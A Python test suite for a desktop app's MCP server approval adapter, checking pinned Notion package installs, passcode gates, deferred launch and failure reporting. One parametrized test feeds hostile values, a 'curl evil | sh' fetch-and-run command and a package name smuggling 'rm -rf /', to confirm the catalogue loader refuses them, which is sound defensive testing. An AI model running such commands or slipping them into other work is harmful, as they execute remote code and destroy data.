"""Desk connect-by-URL, slice 4: the MCP approval/activation adapter
(docs/DESK_CONNECT_BY_URL_SPEC.md, "Slice 4 as built"; Dave 2026-10-03: curated
packages first, arbitrary packages wait for installer hardening).

Pinned:

  * the curated catalogue is data that cannot carry executable configuration: a
    command, an argument, a URL, an unpinned version, a remote kind or a non-OSI
    licence is refused when the file is loaded;
  * Notion's MCP row is a selectable method with a review card built from the
    catalogue alone; every other service keeps "MCP: information only";
  * an unattended caller gets 403 before anything is read, a missing or wrong
    passcode writes nothing, and a good Save asks for the passcode exactly once;
  * the install must be approved with the pins that were shown: an absent approval or a
    changed package, version or checksum is refused BEFORE the passcode;
  * the launch is deferred: Save runs `npm view` (metadata, public registry) and never
    `npx`; the registered config names the vault entry and holds no value and no `env`;
  * the registry serving a different checksum, a missing Node.js, a timeout or a failed
    config write leave the committed token in place and read "Saved; setup failed",
    never registered; a retry does not ask for the token again;
  * a server of the same name that is not ours is never replaced.
"""
from __future__ import annotations

import copy
import json
import subprocess
import sys
from pathlib import Path
from types import SimpleNamespace

import pytest

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO))

from tests.test_desk_connect import (PASSCODE, RID, SECRET, _commit_req, _vault_names,  # noqa: E402,F401
                                     env as _base_env)

from mc.desk_connect import mcp_activation, mcp_catalogue  # noqa: E402

URL = 'https://www.notion.so'


def _notion() -> dict:
    e = mcp_catalogue.for_service('notion')
    assert e is not None
    return e


@pytest.fixture()
def env(_base_env, tmp_path, monkeypatch):
    """The slice-1 environment plus a throwaway MCP config (never the real
    ~/.claude.json) and a fake Node toolchain that records what it was asked to run."""
    from mc import mcp
    cfg = tmp_path / 'claude.json'
    monkeypatch.setattr(mcp, 'GLOBAL_CLAUDE_JSON', cfg)
    rec = {'runs': [], 'integrity': _notion()['integrity'], 'code': 0,
           'timeout': False, 'tools': {'npm': 'C:/fake/npm', 'npx': 'C:/fake/npx'}}

    def which(name):
        return rec['tools'].get(name)

    def run(cmd, **kw):
        rec['runs'].append(list(cmd))
        if rec['timeout']:
            raise subprocess.TimeoutExpired(cmd, 1)
        return subprocess.CompletedProcess(cmd, rec['code'], stdout=json.dumps(rec['integrity']) + '\n', stderr='')

    monkeypatch.setattr(mcp_activation, '_which', which)
    monkeypatch.setattr(mcp_activation, 'subprocess', SimpleNamespace(
        run=run, TimeoutExpired=subprocess.TimeoutExpired, CompletedProcess=subprocess.CompletedProcess))
    client, calls, _home = _base_env
    return client, calls, rec, cfg


def _install(**over):
    e = _notion()
    d = {'approved': True, **mcp_catalogue.pins(e)}
    d.update(over)
    return d


def _draft(secret=SECRET, install=None, **fields):
    f = {'install': _install() if install is None else install}
    if secret:
        f['secret'] = secret
    f.update(fields)
    return {'url': URL, 'method': 'mcp', 'fields': f}


def _servers(cfg):
    return json.loads(cfg.read_text(encoding='utf-8')).get('mcpServers', {}) if cfg.exists() else {}


# -- the catalogue -----------------------------------------------------------------

def _entry():
    return copy.deepcopy(json.loads(mcp_catalogue.CATALOGUE_PATH.read_text(encoding='utf-8'))['packages'][0])


def _load_with(tmp_path, mutate):
    e = _entry()
    mutate(e)
    p = tmp_path / 'cat.json'
    p.write_text(json.dumps({'version': 1, 'packages': [e]}), encoding='utf-8')
    return mcp_catalogue.load(p)


def test_the_shipped_catalogue_is_valid_and_pinned():
    e = _notion()
    assert e['kind'] == 'npx' and e['package'] == '@notionhq/notion-mcp-server'
    assert e['version'].count('.') == 2 and e['integrity'].startswith('sha512-')
    assert mcp_catalogue.for_service('x') is None and mcp_catalogue.for_service(None) is None


@pytest.mark.parametrize('mutate', [
    lambda e: e.update(command='curl evil | sh'),                      # no executable configuration of its own
    lambda e: e.update(args=['--flag']),
    lambda e: e.update(url='https://mcp.example/sse'),
    lambda e: e.update(kind='remote'),                                 # remote endpoints need their own review
    lambda e: e.update(kind='uvx'),
    lambda e: e.update(version='^2.5.2'),                              # a range is not a pin
    lambda e: e.update(version='latest'),
    lambda e: e.update(version='2.5.2-beta.1'),
    lambda e: e.update(integrity='sha1-abc'),
    lambda e: e.update(licence='Proprietary'),
    lambda e: e.update(package='notion; rm -rf /'),
    lambda e: e['credential'].update(vault='ron@example'),
    lambda e: e['credential'].update(vault='oauth.notion'),
    lambda e: e['credential'].update(env='lower'),
    lambda e: e['credential'].update(value='ntn_real'),                # no value field, ever
    lambda e: e.update(server_name='bad name'),
    lambda e: e.update(permissions=[]),
])
def test_a_catalogue_entry_that_breaks_a_rule_is_refused(tmp_path, mutate):
    with pytest.raises(mcp_catalogue.CatalogueError):
        _load_with(tmp_path, mutate)


def test_the_catalogue_is_read_from_next_to_the_module_only():
    assert mcp_catalogue.CATALOGUE_PATH.parent == Path(mcp_catalogue.__file__).parent


def test_the_review_card_holds_only_catalogue_facts():
    card = mcp_catalogue.card(_notion())
    assert set(card) == {'id', 'name', 'kind', 'source', 'version', 'integrity', 'licence', 'unpacked_bytes',
                         'purpose', 'permissions', 'server_name', 'credential', 'pins'}
    assert 'readme' not in json.dumps(card).lower()
    assert set(card['credential']) == {'env', 'vault', 'label'}


# -- the Method step ---------------------------------------------------------------

def test_notion_offers_a_selectable_mcp_method_with_its_review_card(env):
    client, _, _, _ = env
    got = client.post('/api/desk/connect/inspect', json={'input': 'Notion'}).get_json()
    assert got['service']['id'] == 'notion'
    mcp_rows = [o for o in got['options'] if o['method'] == 'mcp']
    assert len(mcp_rows) == 1 and mcp_rows[0]['support'] == 'available' and mcp_rows[0]['selectable'] is True
    card = mcp_rows[0]['connector']['install']
    assert card['pins'] == mcp_catalogue.pins(_notion())
    assert [f['key'] for f in mcp_rows[0]['connector']['fields']] == ['secret', 'allow_unattended']
    assert SECRET not in json.dumps(got)


def test_other_services_keep_mcp_information_only(env):
    client, _, _, _ = env
    for host in ('https://x.com', 'https://platform.openai.com', 'https://plausible.io'):
        got = client.post('/api/desk/connect/inspect', json={'input': host}).get_json()
        rows = [o for o in got['options'] if o['method'] == 'mcp']
        assert len(rows) == 1 and rows[0]['support'] == 'info_only' and rows[0]['selectable'] is False, host
        assert 'connector' not in rows[0], host


def test_a_hand_built_mcp_request_for_another_service_is_refused(env):
    client, calls, rec, cfg = env
    d = _draft()
    d['url'] = 'https://platform.openai.com'
    r = _commit_req(client, d)
    assert r.status_code == 400 and r.get_json()['code'] == 'method_not_available'
    assert calls['n'] == 0 and _vault_names() == [] and _servers(cfg) == {} and rec['runs'] == []


# -- the gates ---------------------------------------------------------------------

def test_an_agent_session_gets_403_and_nothing_is_read_or_written(env):
    from mc.state import agent_sessions
    client, calls, rec, cfg = env
    agent_sessions['scheduled-1'] = {'status': 'running', 'trigger_type': 'scheduled', 'project_id': 'p'}
    r = _commit_req(client, _draft())
    assert r.status_code == 403
    assert calls['n'] == 0 and _vault_names() == [] and _servers(cfg) == {} and rec['runs'] == []


@pytest.mark.parametrize('install', [None, {}, {'approved': False, 'package': 'x', 'version': 'x', 'integrity': 'x'},
                                     {'package': 'x'}, 'yes'])
def test_an_install_that_was_not_approved_is_refused_before_the_passcode(env, install):
    client, calls, rec, cfg = env
    d = _draft()
    if install is None:
        d['fields'].pop('install')
    else:
        d['fields']['install'] = install
    r = _commit_req(client, d)
    assert r.status_code == 400 and r.get_json()['code'] == 'install_not_approved'
    assert calls['n'] == 0 and _vault_names() == [] and _servers(cfg) == {} and rec['runs'] == []


def test_an_approval_with_the_right_pins_but_approved_false_is_refused(env):
    client, calls, rec, cfg = env
    r = _commit_req(client, _draft(install=_install(approved=False)))
    assert r.status_code == 400 and r.get_json()['code'] == 'install_not_approved'
    assert calls['n'] == 0 and _vault_names() == []


@pytest.mark.parametrize('over', [{'version': '2.5.3'}, {'package': '@notionhq/other'},
                                  {'integrity': 'sha512-' + 'A' * 86 + '=='}])
def test_changed_pins_are_refused_before_the_passcode(env, over):
    client, calls, rec, cfg = env
    r = _commit_req(client, _draft(install=_install(**over)))
    assert r.status_code == 409 and r.get_json()['code'] == 'pins_changed'
    assert calls['n'] == 0 and _vault_names() == [] and _servers(cfg) == {} and rec['runs'] == []


def test_pins_that_change_between_the_check_and_the_write_are_refused(env, monkeypatch):
    from mc.desk_connect import providers
    from mc.desk_connect.providers.base import ProviderError
    prov = providers.for_service('notion')
    clean = prov.clean('mcp', _draft()['fields'], set())
    bumped = copy.deepcopy(_notion())
    bumped['version'] = '9.9.9'
    monkeypatch.setattr(mcp_catalogue, 'for_service', lambda s: copy.deepcopy(bumped))
    with pytest.raises(ProviderError) as e:
        prov.apply('mcp', clean, None)
    assert e.value.code == 'pins_changed'
    assert _vault_names() == []


@pytest.mark.parametrize('passcode', ['', 'wrong-passcode', None])
def test_a_missing_or_wrong_passcode_writes_nothing(env, passcode):
    client, calls, rec, cfg = env
    body = {'request_id': RID, 'draft': _draft()}
    if passcode is not None:
        body['passcode'] = passcode
    r = client.post('/api/desk/connect/commit', json=body)
    assert r.status_code == 403
    assert calls['n'] == 1 and _vault_names() == [] and _servers(cfg) == {} and rec['runs'] == []


# -- a good Save -------------------------------------------------------------------

def test_a_good_save_stores_the_token_and_registers_a_pinned_server_without_launching_it(env):
    client, calls, rec, cfg = env
    r = _commit_req(client, _draft())
    body = r.get_json()
    assert r.status_code == 201, body
    assert calls['n'] == 1                                            # exactly one passcode check per Save
    assert body['stored'] == ['notion.token']
    assert body['setup']['state'] == 'done' and body['setup']['server'] == 'notion'
    assert body['approval'] == mcp_catalogue.pins(_notion())
    assert body['status']['state'] == 'registered' and body['status']['label'] == 'Registered with agents, not verified'
    # The launch is deferred: the only process this Save ran was a metadata read.
    assert len(rec['runs']) == 1 and rec['runs'][0][:3] == ['C:/fake/npm', 'view', '@notionhq/notion-mcp-server@2.5.2']
    assert '--registry' in rec['runs'][0] and mcp_activation.PUBLIC_REGISTRY in rec['runs'][0]
    assert not any(c[:1] == ['C:/fake/npx'] for c in rec['runs'])
    srv = _servers(cfg)['notion']
    assert set(srv) == {'command', 'args'}                            # no env, no headers, no url
    assert srv['args'][1:] == ['--raw', '--env', 'NOTION_TOKEN=notion.token', '--', 'C:/fake/npx', '-y',
                               '@notionhq/notion-mcp-server@2.5.2']
    assert srv['args'][0].replace('\\', '/').endswith('tools/with-secret.py')
    assert _vault_names() == ['notion.token']
    assert SECRET not in cfg.read_text(encoding='utf-8') and SECRET not in json.dumps(body)


def test_a_replayed_request_id_writes_nothing_twice(env):
    client, calls, rec, cfg = env
    assert _commit_req(client, _draft()).status_code == 201
    r = _commit_req(client, _draft())
    assert r.status_code == 200 and r.get_json()['duplicate'] is True
    assert len(rec['runs']) == 1 and list(_servers(cfg)) == ['notion']


def test_no_credential_value_reaches_the_log(env, capsys):
    client, _, _, _ = env
    _commit_req(client, _draft())
    out = capsys.readouterr()
    assert SECRET not in out.out and SECRET not in out.err


def test_the_launch_line_comes_from_the_catalogue_only(env):
    cfg = mcp_activation.launch_config(_notion())
    assert cfg['command'] == sys.executable
    assert cfg['args'][1:] == ['--raw', '--env', 'NOTION_TOKEN=notion.token', '--', 'C:/fake/npx', '-y',
                               '@notionhq/notion-mcp-server@2.5.2']


# -- partial provisioning: the committed token stays, the setup is reported failed -------

def _assert_setup_failed(r, code, cfg, calls):
    body = r.get_json()
    assert r.status_code == 201, body
    assert body['setup']['state'] == 'failed' and body['setup']['code'] == code
    assert body['stored'] == ['notion.token'] and _vault_names() == ['notion.token']   # not rolled back
    assert 'notion' not in _servers(cfg)
    assert calls['n'] == 1
    return body


def test_a_checksum_the_registry_no_longer_serves_is_not_registered(env):
    client, calls, rec, cfg = env
    rec['integrity'] = 'sha512-' + 'B' * 86 + '=='
    body = _assert_setup_failed(_commit_req(client, _draft()), 'pin_mismatch', cfg, calls)
    assert body['status']['state'] == 'setup_failed' and body['status']['label'] == 'Saved; setup failed'
    assert 'NOT registered' in body['setup']['message']


def test_missing_node_is_a_failed_setup_with_the_token_kept(env):
    client, calls, rec, cfg = env
    rec['tools'].pop('npm')
    _assert_setup_failed(_commit_req(client, _draft()), 'node_missing', cfg, calls)


def test_a_registry_timeout_is_a_failed_setup(env):
    client, calls, rec, cfg = env
    rec['timeout'] = True
    _assert_setup_failed(_commit_req(client, _draft()), 'pin_check_timeout', cfg, calls)


def test_an_npm_failure_is_a_failed_setup(env):
    client, calls, rec, cfg = env
    rec['code'] = 1
    _assert_setup_failed(_commit_req(client, _draft()), 'pin_check_failed', cfg, calls)


def test_a_config_write_failure_is_a_failed_setup(env, monkeypatch):
    client, calls, rec, cfg = env
    from mc import mcp

    def boom(*a, **k):
        raise OSError('disk full')
    monkeypatch.setattr(mcp, 'write_server', boom)
    _assert_setup_failed(_commit_req(client, _draft()), 'register_failed', cfg, calls)


def test_a_bug_in_provisioning_reads_as_a_failed_setup_never_as_success(env, monkeypatch):
    client, calls, rec, cfg = env

    def boom(entry):
        raise RuntimeError('x')
    monkeypatch.setattr(mcp_activation, 'register', boom)
    _assert_setup_failed(_commit_req(client, _draft()), 'setup_failed', cfg, calls)


def test_a_retry_after_a_failed_setup_does_not_ask_for_the_token_again(env):
    client, calls, rec, cfg = env
    rec['code'] = 1
    assert _commit_req(client, _draft()).status_code == 201 and 'notion' not in _servers(cfg)
    rec['code'] = 0
    got = client.post('/api/desk/connect/inspect', json={'input': 'Notion'}).get_json()
    f = next(o for o in got['options'] if o['method'] == 'mcp')['connector']['fields'][0]
    assert f['present'] is True and f['required'] is False
    r = _commit_req(client, _draft(secret=''), rid='req-0002-abcdef')
    assert r.status_code == 201, r.get_json()
    assert r.get_json()['setup']['state'] == 'done' and r.get_json()['stored'] == []
    assert calls['n'] == 2                                            # one check per Save
    assert _vault_names() == ['notion.token'] and 'notion' in _servers(cfg)


def test_saving_again_when_already_registered_changes_nothing(env):
    client, calls, rec, cfg = env
    assert _commit_req(client, _draft()).status_code == 201
    before = cfg.read_text(encoding='utf-8')
    r = _commit_req(client, _draft(secret=''), rid='req-0002-abcdef')
    assert r.status_code == 201 and r.get_json()['setup']['state'] == 'done'
    assert cfg.read_text(encoding='utf-8') == before


# -- a server that is not ours -----------------------------------------------------

def test_a_server_of_the_same_name_that_is_not_ours_is_never_replaced(env):
    client, calls, rec, cfg = env
    from mc import mcp
    mcp.write_server('notion', 'stdio', {'command': 'node', 'args': ['mine.js']}, 'global')
    before = cfg.read_text(encoding='utf-8')
    r = _commit_req(client, _draft())
    assert r.status_code == 409 and r.get_json()['code'] == 'server_exists'
    assert calls['n'] == 0 and _vault_names() == [] and rec['runs'] == []   # refused before the passcode
    assert cfg.read_text(encoding='utf-8') == before


def test_a_new_token_over_an_existing_entry_is_refused(env):
    client, calls, rec, cfg = env
    from mc import secrets_store
    secrets_store.set_secret('notion.token', 'old-token', description='', scope='global')
    r = _commit_req(client, _draft())                                 # a typed token while one exists: refused, as for every key
    assert r.status_code == 409 and calls['n'] == 0 and _servers(cfg) == {}


# -- status ------------------------------------------------------------------------

def test_the_status_of_an_mcp_method_is_never_verified(env):
    client, _, rec, cfg = env
    _commit_req(client, _draft())
    st = client.post('/api/desk/connect/verify', json={'service': 'notion', 'method': 'mcp', 'check': False}).get_json()
    assert st['state'] == 'registered' and st['label'] == 'Registered with agents, not verified'
    v = client.post('/api/desk/connect/verify', json={'service': 'notion', 'method': 'mcp'}).get_json()
    assert v['state'] == 'registered'                                 # no free read-only check exists
    assert len(rec['runs']) == 1                                      # and the check ran nothing


def test_the_status_reads_setup_failed_when_the_token_is_stored_and_no_server_is(env):
    client, _, rec, cfg = env
    rec['code'] = 1
    _commit_req(client, _draft())
    st = client.post('/api/desk/connect/verify', json={'service': 'notion', 'method': 'mcp', 'check': False}).get_json()
    assert st['state'] == 'setup_failed' and st['label'] == 'Saved; setup failed'
